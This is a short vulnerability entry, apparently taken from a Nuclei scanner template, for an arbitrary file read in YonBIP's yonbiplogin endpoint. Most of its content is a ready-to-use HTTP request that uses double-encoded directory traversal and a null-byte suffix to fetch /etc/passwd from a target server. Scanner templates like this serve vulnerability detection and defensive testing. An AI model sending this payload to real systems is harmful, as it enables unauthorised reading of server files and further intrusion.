# Vulnerability: YonBIP - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`yonyou-yonbip-lfi.yaml`)

## Description
There is an arbitrary file reading vulnerability in yonbiplogin, the advanced version of YonBIP

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
```

